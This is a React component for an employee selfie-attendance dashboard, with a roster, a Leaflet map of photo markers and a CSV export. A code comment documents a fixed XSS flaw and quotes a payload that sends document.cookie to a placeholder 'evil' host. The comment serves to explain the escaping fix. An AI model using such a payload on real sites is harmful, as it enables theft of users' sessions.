import { useEffect, useMemo, useRef, useState } from 'react';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import { selfieApi, userApi } from '@/services/api';
import PageHeader from '@/components/dashboard/PageHeader';
import SurfaceCard from '@/components/dashboard/SurfaceCard';
import EmployeeSelect from '@/components/ui/EmployeeSelect';
import { resolveMediaUrl } from '@/lib/mediaUrl';
import { escapeHtml } from '@/lib/escapeHtml';
import {
  buildSelfieRoster,
  groupSelfiesByLocation,
  type RosterRow,
  type SelfieItem,
} from '@/features/monitoring/selfieRoster';

const todayISO = () => {
  const d = new Date();
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
};

const dayLabel = (dateISO: string) => {
  if (dateISO === todayISO()) return 'Today';
  const parsed = new Date(`${dateISO}T00:00:00`);
  return Number.isNaN(parsed.getTime())
    ? dateISO
    : parsed.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
};

const punchTimeLabel = (selfie: SelfieItem) => {
  const parsed = new Date(selfie.created_at);
  return Number.isNaN(parsed.getTime())
    ? ''
    : parsed.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
};

/**
 * The selfies page is a verification wall: who punched in, from where, and —
 * front and center — who didn't. The roster leads; the map beside it uses
 * photo markers (no CDN pin icons), groups same-spot punches into one badge,
 * and stays in sync with the list.
 */
export default function SelfieMapView() {
  const mapRef = useRef<HTMLDivElement>(null);
  const mapInstanceRef = useRef<L.Map | null>(null);
  const layerRefs = useRef<Array<L.Marker | L.Circle>>([]);
  const markerByGroupRef = useRef<Map<string, L.Marker>>(new Map());
  const [selfies, setSelfies] = useState<SelfieItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedUserId, setSelectedUserId] = useState<number | ''>('');
  const [startDate, setStartDate] = useState(todayISO);
  const [endDate, setEndDate] = useState(todayISO);
  const [employees, setEmployees] = useState<{ id: number; name: string }[]>([]);
  const [lightbox, setLightbox] = useState<{ url: string; name: string } | null>(null);

  const isSingleDay = startDate === endDate;

  useEffect(() => {
    userApi.getAll({ period: 'all' }).then((res) => {
      setEmployees(res.data || []);
    }).catch(() => {});
  }, []);

  useEffect(() => {
    let cancelled = false;
    setLoading(true);
    const params: any = { start_date: startDate, end_date: endDate };
    if (selectedUserId) params.user_id = selectedUserId;

    selfieApi.mapData(params)
      .then((res) => {
        if (cancelled) return;
        const data = (res.data.data || []).map((item: any) => ({
          ...item,
          image_url: resolveMediaUrl(item.image_url),
        }));
        setSelfies(data);
      })
      .catch(() => {
        if (!cancelled) setSelfies([]);
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });

    return () => {
      cancelled = true;
    };
  }, [startDate, endDate, selectedUserId]);

  const rosterDays = useMemo(
    () => buildSelfieRoster(selfies, employees, {
      singleDay: isSingleDay,
      dayISO: startDate,
      selectedUserId,
    }),
    [selfies, employees, isSingleDay, startDate, selectedUserId]
  );

  const locationGroups = useMemo(() => groupSelfiesByLocation(selfies), [selfies]);
  const noGpsCount = selfies.filter((selfie) => selfie.latitude === null || selfie.longitude === null).length;

  useEffect(() => {
    if (!mapRef.current || mapInstanceRef.current) return undefined;
    const map = L.map(mapRef.current, {
      center: [20, 78],
      zoom: 5,
      zoomControl: true,
    });
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '&copy; OpenStreetMap',
      maxZoom: 19,
    }).addTo(map);
    mapInstanceRef.current = map;
    return () => {
      map.remove();
      mapInstanceRef.current = null;
    };
  }, []);

  // Redraw photo markers whenever the data changes.
  useEffect(() => {
    const map = mapInstanceRef.current;
    if (!map) return;

    layerRefs.current.forEach((layer) => layer.remove());
    layerRefs.current = [];
    markerByGroupRef.current.clear();

    if (locationGroups.length === 0) return;

    locationGroups.forEach((group) => {
      const first = group.items[0];
      const count = group.items.length;
      const badge = count > 1
        ? `<span style="position:absolute;top:-6px;right:-6px;background:#3D656B;color:#fff;font:700 10px/17px system-ui;min-width:17px;height:17px;border-radius:999px;text-align:center;padding:0 3px;">${count}</span>`
        : '';
      const icon = L.divIcon({
        className: 'selfie-photo-marker',
        html: `
          <div style="position:relative;width:40px;height:40px;">
            <img src="${escapeHtml(first.image_url)}" alt="" style="width:40px;height:40px;object-fit:cover;border-radius:50%;border:2.5px solid #fff;box-shadow:0 1px 4px rgba(22,25,28,.4);" />
            ${badge}
          </div>`,
        iconSize: [40, 40],
        iconAnchor: [20, 20],
        popupAnchor: [0, -22],
      });

      const marker = L.marker([group.latitude, group.longitude], { icon }).addTo(map);
      // Leaflet's bindPopup takes an HTML string, so every value interpolated
      // here is parsed as markup. The employee display name and the image URL
      // are both attacker-controlled — a name of
      //   <img src=x onerror="fetch('//evil/?c='+document.cookie)">
      // executed in the browser of any admin who opened the selfie map. Escape
      // on the way in; escapeHtml also covers the attribute case by encoding
      // quotes, which stops a crafted image_url breaking out of src="…".
      const popupContent = `
        <div style="min-width:190px;max-height:260px;overflow-y:auto;" class="selfie-popup">
          ${group.items.map((selfie) => `
            <div style="display:flex;align-items:center;gap:8px;padding:4px 0;">
              <img src="${escapeHtml(selfie.image_url)}" data-selfie-id="${escapeHtml(selfie.id)}" style="width:44px;height:44px;object-fit:cover;border-radius:8px;cursor:pointer;flex:none;" />
              <div style="min-width:0;">
                <p style="font-weight:600;font-size:12.5px;margin:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(selfie.user?.name || 'Unknown')}</p>
                <p style="font-size:11px;color:#64748b;margin:1px 0 0;">${escapeHtml(selfie.attendance_date)}${selfie.accuracy_meters != null ? ` · ±${escapeHtml(selfie.accuracy_meters)}m` : ''}</p>
              </div>
            </div>`).join('')}
        </div>
      `;
      marker.bindPopup(popupContent);

      marker.on('popupopen', () => {
        const popupEl = marker.getPopup()?.getElement();
        if (!popupEl) return;
        popupEl.querySelectorAll('img[data-selfie-id]').forEach((img) => {
          img.addEventListener('click', () => {
            const selfieId = Number(img.getAttribute('data-selfie-id'));
            const selfie = group.items.find((item) => Number(item.id) === selfieId) || first;
            setLightbox({ url: selfie.image_url, name: selfie.user?.name || 'Unknown' });
          });
        });
      });

      layerRefs.current.push(marker);
      markerByGroupRef.current.set(group.key, marker);

      // One accuracy circle per spot keeps the map readable.
      const accuracy = Number(first.accuracy_meters || 0);
      if (count === 1 && accuracy > 0) {
        const circle = L.circle([group.latitude, group.longitude], {
          radius: accuracy,
          color: '#5D969D',
          weight: 1.5,
          opacity: 0.5,
          fillColor: '#5D969D',
          fillOpacity: 0.08,
        }).addTo(map);
        layerRefs.current.push(circle);
      }
    });

    const markers = layerRefs.current.filter((layer): layer is L.Marker => layer instanceof L.Marker);
    if (markers.length > 0) {
      map.fitBounds(L.featureGroup(markers).getBounds().pad(0.15), { maxZoom: 16 });
    }
  }, [locationGroups]);

  const flyToSelfie = (selfie: SelfieItem) => {
    const map = mapInstanceRef.current;
    if (!map || selfie.latitude === null || selfie.longitude === null) return;
    const key = `${Number(selfie.latitude).toFixed(3)},${Number(selfie.longitude).toFixed(3)}`;
    const marker = markerByGroupRef.current.get(key);
    map.flyTo([Number(selfie.latitude), Number(selfie.longitude)], Math.max(map.getZoom(), 15), { duration: 0.6 });
    marker?.openPopup();
  };

  const exportToCsv = () => {
    const rows = selfies.map((s) => [
      s.user?.name || '',
      s.attendance_date,
      s.latitude ?? '',
      s.longitude ?? '',
      s.accuracy_meters ?? '',
      s.created_at,
    ]);
    const csv = [['Employee', 'Date', 'Latitude', 'Longitude', 'Accuracy (m)', 'Time'].join(',')]
      .concat(rows.map((r) => r.map((v) => `"${v}"`).join(',')))
      .join('\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `selfies-${startDate}-${endDate}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const renderRow = (row: RosterRow) => {
    if (row.kind === 'missing') {
      return (
        <li key={`missing-${row.userId}`} className="flex items-center gap-3 border-b border-slate-100 py-2.5 last:border-b-0">
          <span className="h-9 w-9 flex-none rounded-xl border-2 border-dashed border-slate-300 bg-slate-50" aria-hidden />
          <span className="min-w-0 flex-1 truncate text-sm text-slate-400">{row.userName} — no selfie yet</span>
          <span className="rounded-full bg-slate-100 px-2 py-0.5 font-mono text-[10px] font-semibold text-slate-400">—</span>
        </li>
      );
    }

    const selfie = row.selfie!;
    return (
      <li key={`selfie-${selfie.id}`} className="border-b border-slate-100 last:border-b-0">
        <button
          type="button"
          onClick={() => (row.kind === 'verified' ? flyToSelfie(selfie) : setLightbox({ url: selfie.image_url, name: row.userName }))}
          className="flex w-full items-center gap-3 rounded-lg px-1 py-2.5 text-left transition hover:bg-slate-50"
          title={row.kind === 'verified' ? 'Show on map' : 'Open photo'}
        >
          <img
            src={selfie.image_url}
            alt={`Selfie from ${row.userName}`}
            className="h-9 w-9 flex-none cursor-pointer rounded-xl object-cover"
            onClick={(event) => {
              event.stopPropagation();
              setLightbox({ url: selfie.image_url, name: row.userName });
            }}
          />
          <span className="min-w-0 flex-1">
            <span className="block truncate text-sm font-medium text-slate-800">{row.userName}</span>
            <span className="block text-[11px] text-slate-400">
              {punchTimeLabel(selfie)}{!isSingleDay ? ` · ${selfie.attendance_date}` : ''}
            </span>
          </span>
          {row.kind === 'verified' ? (
            <span className="rounded-full bg-emerald-50 px-2 py-0.5 font-mono text-[10px] font-semibold text-emerald-700">
              GPS{selfie.accuracy_meters != null ? ` ±${selfie.accuracy_meters}m` : ''}
            </span>
          ) : (
            <span className="rounded-full bg-accent-100 px-2 py-0.5 font-mono text-[10px] font-semibold text-accent-700">
              No GPS
            </span>
          )}
        </button>
      </li>
    );
  };

  return (
    <div className="mx-auto max-w-7xl space-y-4 px-4 py-6">
      <PageHeader
        eyebrow="Monitoring"
        title="Selfie Verification"
        description="Who punched in, from where — and who hasn't yet."
      />

      <SurfaceCard>
        <div className="flex flex-wrap items-end gap-3 p-4">
          <div>
            <label className="mb-1 block text-xs font-medium text-slate-500">Employee</label>
            <EmployeeSelect
              employees={employees}
              value={selectedUserId}
              onChange={setSelectedUserId}
              includeAllOption
            />
          </div>
          <div>
            <label className="mb-1 block text-xs font-medium text-slate-500">From</label>
            <input
              type="date"
              value={startDate}
              onChange={(e) => setStartDate(e.target.value)}
              className="rounded-lg border border-slate-300 px-3 py-2 text-sm"
            />
          </div>
          <div>
            <label className="mb-1 block text-xs font-medium text-slate-500">To</label>
            <input
              type="date"
              value={endDate}
              onChange={(e) => setEndDate(e.target.value)}
              className="rounded-lg border border-slate-300 px-3 py-2 text-sm"
            />
          </div>
          <button
            onClick={exportToCsv}
            className="rounded-lg border border-slate-300 bg-white px-3 py-2 text-sm text-slate-600 hover:bg-slate-50"
          >
            Export CSV
          </button>
          <span className="ml-auto text-xs text-slate-400">
            {selfies.length} selfie{selfies.length !== 1 ? 's' : ''}
            {noGpsCount > 0 ? ` · ${noGpsCount} without GPS` : ''}
          </span>
        </div>
      </SurfaceCard>

      <div className="grid grid-cols-1 items-start gap-4 xl:grid-cols-[minmax(320px,0.9fr)_1.1fr]">
        <div className="space-y-4">
          {loading ? (
            <SurfaceCard><p className="p-6 text-sm text-slate-400">Loading selfies…</p></SurfaceCard>
          ) : rosterDays.length === 0 ? (
            <SurfaceCard>
              <div className="p-8 text-center">
                <p className="text-sm font-medium text-slate-700">No selfies in this period.</p>
                <p className="mt-1 text-sm text-slate-500">Punch-in selfies appear here as employees check in.</p>
              </div>
            </SurfaceCard>
          ) : (
            rosterDays.map((day) => (
              <SurfaceCard key={day.dateISO || 'day'}>
                <div className="p-4">
                  <div className="mb-2 flex items-baseline justify-between gap-2">
                    <h2 className="text-sm font-semibold text-slate-800">{dayLabel(day.dateISO)}</h2>
                    <span className="font-mono text-xs text-slate-500">
                      {isSingleDay
                        ? `${day.verifiedCount} of ${day.totalCount} verified`
                        : `${day.rows.length} selfie${day.rows.length === 1 ? '' : 's'}`}
                    </span>
                  </div>
                  <ul>{day.rows.map(renderRow)}</ul>
                </div>
              </SurfaceCard>
            ))
          )}
        </div>

        <SurfaceCard className="xl:sticky xl:top-4">
          <div ref={mapRef} className="z-0 h-[540px] w-full rounded-lg border border-slate-200" />
          <p className="px-4 py-2.5 text-xs text-slate-400">
            Photo markers group same-spot punches into one badge — click a badge to see everyone who checked in there. Click a roster row to fly to its pin.
          </p>
        </SurfaceCard>
      </div>

      {lightbox && (
        <div
          className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/90 p-4"
          onClick={() => setLightbox(null)}
        >
          <div className="relative w-full max-w-3xl" onClick={(e) => e.stopPropagation()}>
            <button
              onClick={() => setLightbox(null)}
              className="absolute -top-10 right-0 z-50 flex h-10 w-10 items-center justify-center text-3xl text-white hover:text-slate-300"
              aria-label="Close"
            >
              ×
            </button>
            <img
              src={lightbox.url}
              alt="Selfie full"
              className="mx-auto max-h-[80vh] max-w-full rounded-lg shadow-2xl"
            />
            <p className="mt-4 text-center text-lg font-medium text-white">{lightbox.name}</p>
          </div>
        </div>
      )}
    </div>
  );
}
